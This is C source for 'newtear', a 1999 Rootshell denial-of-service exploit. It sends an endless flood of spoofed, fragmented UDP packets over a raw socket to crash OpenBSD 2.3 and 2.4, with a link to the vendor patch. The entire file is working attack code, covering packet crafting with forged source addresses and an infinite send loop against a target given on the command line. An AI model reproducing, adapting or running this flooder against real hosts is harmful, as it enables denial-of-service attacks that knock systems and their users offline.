
/*

Rootshell License

LICENSE: THIS PROGRAM MAY BE FREELY DISTRIBUTED AS LONG AS THE CONTENTS OF
THIS FILE ARE NOT MODIFIED.

This file may not be posted on AntiOnline (http://www.antionline.com) or
AntiCode (http://www.anticode.com).  Their staff has a history of removing
all traces of Rootshell copyright notices on code that we write.  Please
report any violations of this policy to Rootshell.

*/

/*
 *
 * modified newtear.c - sends lots of fragmented UDP packets
 * crashes OpenBSD 2.3 and 2.4.
 *
 * Patches:
 *
 * http://www.openbsd.org/errata24.html#maxqueue (2/17/99)
 *
 * [ http://www.rootshell.com/ ] - 2/10/1999
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/socket.h>

#ifdef STRANGE_BSD_BYTE_ORDERING_THING
                        /* OpenBSD < 2.1, all FreeBSD and netBSD, BSDi < 3.0 */
#define FIX(n)  (n)
#else                   /* OpenBSD 2.1, all Linux */
#define FIX(n)  htons(n)
#endif

#define IP_MF   0x2000  /* More IP fragment en route */
#define IPH     0x14    /* IP header size */
#define UDPH    0x8     /* UDP header size */
#define PADDING 0x0
#define MAGIC   0x3
#define COUNT   0x1

void usage(u_char *);
u_long name_resolve(u_char *);
u_short in_cksum(u_short *, int);
void send_frags(int, u_long, u_long, u_short, u_short, u_short);

int main(int argc, char **argv)
{
    int one = 1, i, rip_sock, x=1, id=1;
    u_long  src_ip = 0, dst_ip = 0;
    u_short src_prt = 0, dst_prt = 0;

    if((rip_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
    {
        perror("raw socket");
        exit(1);
    }
    if (setsockopt(rip_sock, IPPROTO_IP, IP_HDRINCL, (char *)&one, sizeof(one))
        < 0)
    {
        perror("IP_HDRINCL");
        exit(1);
    }
    if (argc < 2) usage(argv[0]);
    if (!(dst_ip = name_resolve(argv[1])))
    {
        exit(1);
    }

    srandom((unsigned)(time((time_t)0)));

    fprintf(stderr, "Sending fragmented UDP flood.\n");

    for (;;) {
      x ++;
      src_ip = x*10;
      src_prt = x*10;
      dst_prt = x+1*10;
      if (x>10)
        x = 1;
      for (i = 0; i < 10; i++)
      {
          send_frags(rip_sock, src_ip, dst_ip, src_prt, dst_prt, id++);
      }
    }
    return (0);
}

/*
 *  Send two IP fragments with pathological offsets.  We use an implementation
 *  independent way of assembling network packets that does not rely on any of
 *  the diverse O/S specific nomenclature hinderances (well, linux vs. BSD).
 */

void send_frags(int sock, u_long src_ip, u_long dst_ip, u_short src_prt,
                u_short dst_prt, u_short id)
{
    u_char *packet = NULL, *p_ptr = NULL;   /* packet pointers */
    u_char byte;                            /* a byte */
    struct sockaddr_in sin;                 /* socket protocol structure */

    sin.sin_family      = AF_INET;
    sin.sin_port        = src_prt;
    sin.sin_addr.s_addr = dst_ip;

    /*
     * Grab some memory for our packet, align p_ptr to point at the beginning
     * of our packet, and then fill it with zeros.
     */
    packet = (u_char *)malloc(IPH + UDPH + PADDING);
    p_ptr  = packet;
    bzero((u_char *)p_ptr, IPH + UDPH + PADDING); // Set it all to zero

    byte = 0x45;                        /* IP version and header length */
    memcpy(p_ptr, &byte, sizeof(u_char));
    p_ptr += 2;                         /* IP TOS (skipped) */
    *((u_short *)p_ptr) = FIX(IPH + UDPH + PADDING);    /* total length */
    p_ptr += 2;
    *((u_short *)p_ptr) = htons(id);   /* IP id */
    p_ptr += 2;
    *((u_short *)p_ptr) |= FIX(IP_MF);  /* IP frag flags and offset */
    p_ptr += 2;
    *((u_short *)p_ptr) = 247;         /* IP TTL */
    byte = IPPROTO_UDP;
    memcpy(p_ptr + 1, &byte, sizeof(u_char));
    p_ptr += 4;                         /* IP checksum filled in by kernel */
    *((u_long *)p_ptr) = src_ip;        /* IP source address */
    p_ptr += 4;
    *((u_long *)p_ptr) = dst_ip;        /* IP destination address */
    p_ptr += 4;
    *((u_short *)p_ptr) = htons(src_prt);       /* UDP source port */
    p_ptr += 2;
    *((u_short *)p_ptr) = htons(dst_prt);       /* UDP destination port */
    p_ptr += 2;
    *((u_short *)p_ptr) = htons(8);

    if (sendto(sock, packet, IPH + UDPH + PADDING, 0, (struct sockaddr *)&sin,
                sizeof(struct sockaddr)) == -1)
    {
        perror("\nsendto");
        free(packet);
        exit(1);
    }
    free(packet);
}


u_long name_resolve(u_char *host_name)
{
    struct in_addr addr;
    struct hostent *host_ent;

    if ((addr.s_addr = inet_addr(host_name)) == -1)
    {
        if (!(host_ent = gethostbyname(host_name))) return (0);
        bcopy(host_ent->h_addr, (char *)&addr.s_addr, host_ent->h_length);
    }
    return (addr.s_addr);
}

void usage(u_char *name)
{
    fprintf(stderr,
            "%s dst_ip\n",
            name);
    exit(0);
}

